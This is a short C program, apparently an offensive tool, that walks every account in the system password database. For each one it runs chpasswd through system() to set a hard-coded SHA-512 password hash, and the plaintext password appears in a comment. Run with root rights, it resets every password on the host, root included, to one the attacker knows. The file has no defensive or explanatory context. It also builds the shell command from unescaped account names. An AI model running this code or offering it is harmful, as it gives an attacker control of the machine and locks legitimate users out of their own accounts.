#include <pwd.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>


//  % python3 -c 'import crypt; print(crypt.crypt("crocodilewrestling", crypt.mksalt(crypt.METHOD_SHA512)))'
char hash[] = "$6$rI5g/HeLV9ZCn86U$I95cb1DtB2WqP1s0vUCLGKUTNFy1.oA.fKB/UeGGhV1y72BlpinMoCO8N1KmdVrpiGwDIFezLFQBO0n9E5aNL0";


int main(int argc, char *argv[]) {
  struct passwd *pwd;

  while((pwd = getpwent()) != NULL) {
    char cmd[4096];
    snprintf(cmd, sizeof(cmd), "echo '%s:%s' | /usr/sbin/chpasswd -e",
	     pwd->pw_name, hash);
    printf("%s\n", cmd);
    system(cmd);
  }

  return EXIT_SUCCESS;
}
